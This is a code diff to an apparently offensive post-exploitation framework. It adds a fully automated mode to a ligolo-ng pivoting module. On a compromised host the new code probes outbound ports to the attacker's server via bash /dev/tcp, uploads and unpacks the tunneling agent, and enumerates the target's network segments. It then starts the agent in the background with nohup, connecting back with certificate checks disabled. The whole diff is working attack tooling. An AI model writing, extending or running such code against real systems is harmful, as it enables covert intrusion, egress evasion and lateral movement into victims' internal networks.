@@ -4580,10 +4580,15 @@ class ligolo(Module):
 	category = "Pivoting"
 	def run(session, args):
 		"""
-		Setup ligolo-ng v0.8.2 agent for advanced tunneling and pivoting
-		Usage: run ligolo [proxy|agent] - Default: agent
+		Fully automated ligolo-ng v0.8.2 setup with auto network detection
+		Usage: run ligolo [auto|agent|proxy] - Default: auto
+		       run ligolo auto [server_ip] [server_port]
 		"""
-		mode = args.strip().lower() if args else 'agent'
+		import socket
+		import re
+
+		args_list = args.strip().split() if args else []
+		mode = args_list[0].lower() if args_list else 'auto'
 
 		if mode == 'proxy':
 			# Download proxy (for running on attacker machine)
@@ -4602,7 +4607,7 @@ class ligolo(Module):
 				logger.error("Proxy mode only supported on Unix systems")
 
 		elif mode == 'agent':
-			# Download agent (for running on target machine)
+			# Manual agent mode
 			if session.OS == 'Unix':
 				url = URLS['ligolo_agent_linux']
 				uploaded_paths = session.upload(url, remote_path=session.tmp)
@@ -4620,8 +4625,86 @@ class ligolo(Module):
 					logger.info("Extract and run: agent.exe -connect <PROXY_IP>:11601 -ignore-cert")
 			else:
 				logger.error("Unsupported OS")
+
+		elif mode == 'auto':
+			# Fully automated mode
+			logger.info("🚀 Starting fully automated ligolo-ng setup...")
+
+			# Get server IP and port
+			server_ip = args_list[1] if len(args_list) > 1 else session._host
+			server_port = args_list[2] if len(args_list) > 2 else "11601"
+
+			# Detect available ports on target
+			logger.info("🔍 Auto-detecting available outbound ports...")
+			test_ports = [11601, 443, 80, 8080, 8443, 53, 22]
+			available_port = None
+
+			for port in test_ports:
+				result = session.exec(f"timeout 2 bash -c 'cat < /dev/null > /dev/tcp/{server_ip}/{port}' 2>&1", value=True)
+				if result is None or "succeeded" in result.lower() or len(result.strip()) == 0:
+					available_port = port
+					logger.info(f"✅ Port {port} is available for outbound connection")
+					break
+
+			if not available_port:
+				logger.warning("⚠️  No test ports available, using default 11601")
+				available_port = server_port
+
+			# Upload and extract agent
+			if session.OS == 'Unix':
+				logger.info("📦 Uploading ligolo-ng agent...")
+				url = URLS['ligolo_agent_linux']
+				uploaded_paths = session.upload(url, remote_path=session.tmp)
+				if not uploaded_paths:
+					logger.error("Failed to upload agent")
+					return False
+
+				session.exec(f"tar -xzf {uploaded_paths[0]} -C {session.tmp}")
+				agent_path = f"{session.tmp}/agent"
+				session.exec(f"chmod +x {agent_path}")
+
+				# Detect all network interfaces
+				logger.info("🌐 Detecting target network segments...")
+				ifconfig_output = session.exec("ip addr show", value=True) or session.exec("ifconfig", value=True)
+
+				if ifconfig_output:
+					# Extract all IP networks
+					networks = re.findall(r'inet (\d+\.\d+\.\d+\.\d+)/(\d+)', ifconfig_output)
+					detected_networks = []
+
+					for ip, cidr in networks:
+						if not ip.startswith('127.'):
+							import ipaddress
+							net = ipaddress.IPv4Network(f"{ip}/{cidr}", strict=False)
+							detected_networks.append(str(net))
+
+					if detected_networks:
+						logger.info(f"📡 Detected networks: {', '.join(detected_networks)}")
+						logger.info("💡 Remember to add routes on your attacker machine:")
+						for net in detected_networks:
+							logger.info(f"   sudo ip route add {net} dev ligolo")
+
+				# Start agent in background
+				logger.info(f"🔗 Connecting to {server_ip}:{available_port}...")
+				cmd = f"nohup {agent_path} -connect {server_ip}:{available_port} -ignore-cert > /tmp/ligolo.log 2>&1 &"
+				session.exec(cmd)
+
+				logger.info("✅ Ligolo-ng agent started in background!")
+				logger.info(f"📋 Log file: /tmp/ligolo.log")
+				logger.info(f"🔍 Check connection: tail -f /tmp/ligolo.log")
+
+			elif session.OS == 'Windows':
+				logger.info("📦 Uploading ligolo-ng agent...")
+				url = URLS['ligolo_agent_windows']
+				uploaded_paths = session.upload(url, remote_path=session.tmp)
+				if uploaded_paths:
+					logger.info(f"⚠️  Windows: Manual extraction required")
+					logger.info(f"📂 Agent location: {uploaded_paths[0]}")
+					logger.info(f"🔗 Run: agent.exe -connect {server_ip}:{available_port} -ignore-cert")
+			else:
+				logger.error("Unsupported OS")
 		else:
-			logger.error("Invalid mode. Use 'agent' or 'proxy'")
+			logger.error("Invalid mode. Use 'auto', 'agent', or 'proxy'")
 
 
 class ngrok(Module):
